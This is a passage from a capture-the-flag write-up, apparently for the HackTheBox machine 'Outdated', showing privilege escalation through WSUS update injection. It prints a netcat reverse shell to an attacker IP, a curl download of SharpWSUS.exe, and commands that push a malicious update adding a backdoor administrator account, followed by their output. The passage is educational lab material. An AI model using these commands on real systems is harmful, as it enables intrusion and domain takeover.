<div class="sourceCode" id="cb21" style="background: #f1f3f5;"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb21-1"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span>Evil-WinRM<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">PS</span> C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\Windows\Tasks<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">./</span>nc64<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">exe</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">10.10</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">14.4</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">4488</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>e powershell</span>
<span id="cb21-2">➜  outdated nc <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>lvnp <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">4488</span></span>
<span id="cb21-3"><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">listening</span> on <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[</span>any<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">]</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">4488</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">...</span></span>
<span id="cb21-4">connect to <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">10.10.14.4</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">]</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">from</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>UNKNOWN<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">)</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">10.10.11.175</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">]</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">49257</span></span>
<span id="cb21-5"><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">Windows</span> PowerShell </span>
<span id="cb21-6">Copyright <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">)</span> Microsoft Corporation<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span> All rights reserved<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span></span>
<span id="cb21-7"></span>
<span id="cb21-8"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">PS</span> C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\Windows\Tasks<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span>\WSuspicious<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">exe</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span>command<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">" - accepteula - s - d cmd / c 'echo test &gt; C:\Windows\Tasks\wsuspicious.txt'"</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span>autoinstall</span>
<span id="cb21-9"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span>\WSuspicious<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">exe</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span>command<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">" - accepteula - s - d cmd / c 'echo test &gt; C:\Windows\Tasks\wsuspicious.txt'"</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span>autoinstall</span>
<span id="cb21-10">Detected WSUS Server <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span> wsus<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">outdated</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">htb</span></span>
<span id="cb21-11">Listening on <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'ExplicitProxyEndPoint'</span> endpoint at Ip <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">127.0</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">0.1</span> and port<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">13337</span> </span>
<span id="cb21-12">Hit any key to <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">exit</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">..</span></span></code></pre></div>
<p>Waiting for a few minutes and still nothing happens.. there seems to be something wrong on our end as when reading about WSuspicious it should also force look for updates:</p>
<blockquote class="blockquote">
<p><em>“<a href="https://github.com/GoSecure/wsuspicious">WSuspicious</a> is a C# program that takes the place of the user local proxy and forces the computer to look for updates while intercepting the WSUS traffic to inject a malicious payload.”</em></p>
</blockquote>
</section>
<section id="step-3-1" class="level3">
<h3 class="anchored" data-anchor-id="step-3-1">Step 3</h3>
<p>Looking on other tools we find <a href="https://github.com/nettitude/SharpWSUS">SharpWSUS</a>. Compile it, upload to target and exploit the target to create a new administrator user.</p>
<div class="sourceCode" id="cb22" style="background: #f1f3f5;"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb22-1"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span>Evil-WinRM<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">PS</span> C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\Windows\Tasks<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">curl</span> http<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">://</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">10.10</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">14.4</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span>SharpWSUS<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">exe</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>o C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\Windows\Tasks\SharpWSUS<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">exe</span></span>
<span id="cb22-2"></span>
<span id="cb22-3"></span>
<span id="cb22-4"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span>Evil-WinRM<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">PS</span> C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\Windows\Tasks<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span>\SharpWSUS<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">exe</span> create <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span>payload<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'C:\Windows\Tasks\PsExec64.exe'</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span>args<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'-accepteula -s -d cmd.exe /c \"net user 0xpthree Password123! /add &amp;&amp; net localgroup Administrators 0xpthree /add &amp;&amp; net localgroup Remote Management Users 0xpthree /add"'</span></span>
<span id="cb22-5"></span>
<span id="cb22-6"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[*]</span> Action<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> Create Update</span>
<span id="cb22-7"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[*]</span> Creating patch to use the following<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span></span>
<span id="cb22-8"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[*]</span> Payload<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> PsExec64<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">exe</span></span>
<span id="cb22-9"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[*]</span> Payload Path<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\Windows\Tasks\PsExec64<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">exe</span></span>
<span id="cb22-10"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[*]</span> Arguments<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>accepteula <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>s <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>d cmd<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">exe</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span>c <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"net user 0xpthree Password123! /add &amp;&amp; net localgroup Administrators 0xpthree /add &amp;&amp; net localgroup Remote Management Users 0xpthree /add"</span></span>
<span id="cb22-11"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[*]</span> Arguments <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>HTML Encoded<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">):</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>accepteula <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>s <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>d cmd<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">exe</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span>c <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&amp;</span>amp<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span>quot<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span>net user 0xpthree Password123<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">!</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span>add <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&amp;</span>amp<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span>amp<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;&amp;</span>amp<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span>amp<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span> net localgroup Administrators 0xpthree <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span>add <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&amp;</span>amp<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span>amp<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;&amp;</span>amp<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span>amp<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span> net localgroup Remote Management Users 0xpthree <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span>add<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&amp;</span>amp<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span>quot<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="cb22-12"></span>
<span id="cb22-13"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">################# WSUS Server Enumeration via SQL ##################</span></span>
<span id="cb22-14">ServerName<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> WSUSPortNumber<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> WSUSContentLocation</span>
<span id="cb22-15"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-----------------------------------------------</span></span>
<span id="cb22-16">DC<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">8530</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> c<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\WSUS\WsusContent</span>
<span id="cb22-17"></span>
<span id="cb22-18">ImportUpdate</span>
<span id="cb22-19">Update Revision ID<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">54</span></span>
<span id="cb22-20"><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">PrepareXMLtoClient</span></span>
<span id="cb22-21">InjectURL2Download</span>
<span id="cb22-22">DeploymentRevision</span>
<span id="cb22-23">PrepareBundle</span>
<span id="cb22-24">PrepareBundle Revision ID<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">55</span></span>
<span id="cb22-25"><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">PrepareXMLBundletoClient</span></span>
<span id="cb22-26">DeploymentRevision</span>
<span id="cb22-27"></span>
<span id="cb22-28"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[*]</span> Update created <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span> When ready to deploy use the following command<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span></span>
<span id="cb22-29"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[*]</span> SharpWSUS<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">exe</span> approve <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span>updateid<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>073f32f7-8d0d-431c-9f43-7758157fe39b <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span>computername<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>Target<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">FQDN</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span>groupname<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Group Name"</span></span>
<span id="cb22-30"></span>
<span id="cb22-31"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[*]</span> To check on the update status use the following command<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span></span>
<span id="cb22-32"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[*]</span> SharpWSUS<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">exe</span> check <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span>updateid<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>073f32f7-8d0d-431c-9f43-7758157fe39b <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span>computername<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>Target<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">FQDN</span></span>
<span id="cb22-33"></span>
<span id="cb22-34"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[*]</span> To delete the update use the following command<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span></span>
<span id="cb22-35"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[*]</span> SharpWSUS<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">exe</span> delete <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span>updateid<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>073f32f7-8d0d-431c-9f43-7758157fe39b <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span>computername<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>Target<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">FQDN</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span>groupname<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Group Name"</span></span>
<span id="cb22-36"></span>
<span id="cb22-37"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[*]</span> Create complete</span>
<span id="cb22-38"></span>
<span id="cb22-39"></span>
<span id="cb22-40"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span>Evil-WinRM<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">PS</span> C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\Windows\Tasks<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">./</span>SharpWSUS<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">exe</span> approve <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span>updateid<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>073f32f7-8d0d-431c-9f43-7758157fe39b <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span>computername<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>dc<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">outdated</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">htb</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span>groupname<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Administrators"</span></span>
<span id="cb22-41"></span>
<span id="cb22-42"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[*]</span> Action<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> Approve Update</span>
<span id="cb22-43"></span>
<span id="cb22-44">Targeting dc<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">outdated</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">htb</span></span>
<span id="cb22-45">TargetComputer<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> ComputerID<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> TargetID</span>
<span id="cb22-46"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">------------------------------------</span></span>
<span id="cb22-47">dc<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">outdated</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">htb</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> bd6d57d0-5e6f-4e74-a789-35c8955299e1<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">1</span></span>
<span id="cb22-48"><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">Group</span> Exists <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> False</span>
<span id="cb22-49"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">Group</span> Created<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> Administrators</span>
<span id="cb22-50">Added Computer To <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">Group</span></span>
<span id="cb22-51">Approved Update</span>
<span id="cb22-52"></span>
<span id="cb22-53"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[*]</span> Approve complete</span>
<span id="cb22-54"></span>
<span id="cb22-55"></span>
<span id="cb22-56">➜  outdated evil-winrm <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>i outdated<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">htb</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>u 0xpthree <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>p Password123<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">!</span></span>
<span id="cb22-57"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span>Evil-WinRM<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">PS</span> C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\Users\0xpthree\Documents<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> whoami</span>
<span id="cb22-58">outdated\0xpthree</span>
<span id="cb22-59"></span>
<span id="cb22-60"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span>Evil-WinRM<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">PS</span> C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\Users\0xpthree\Documents<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> whoami <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span>groups</span>
<span id="cb22-61"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">Group</span> Name                                 <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">Type</span>             SID          Attributes</span>
<span id="cb22-62"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">==========================================</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">================</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">============</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">===============================================================</span></span>
<span id="cb22-63">Everyone                                   Well-known <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span> S-1-1-0      Mandatory <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled by default<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span></span>
<span id="cb22-64">BUILTIN\Administrators                     Alias            S-1-5-32-544 Mandatory <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled by default<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">Group</span> owner</span>
<span id="cb22-65">BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled by default<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span></span>
<span id="cb22-66">BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574 Mandatory <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled by default<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span></span>
<span id="cb22-67">BUILTIN\Pre-Windows <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2000</span> Compatible Access Alias            S-1-5-32-554 Mandatory <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled by default<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span></span>
<span id="cb22-68">NT AUTHORITY\NETWORK                       Well-known <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span> S-1-5-2      Mandatory <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled by default<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span></span>
<span id="cb22-69">NT AUTHORITY\Authenticated Users           Well-known <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span> S-1-5-11     Mandatory <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled by default<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span></span>
<span id="cb22-70">NT AUTHORITY\This Organization             Well-known <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span> S-1-5-15     Mandatory <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled by default<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled <span class="fu" style="color: #4758AB;
background-color: null;
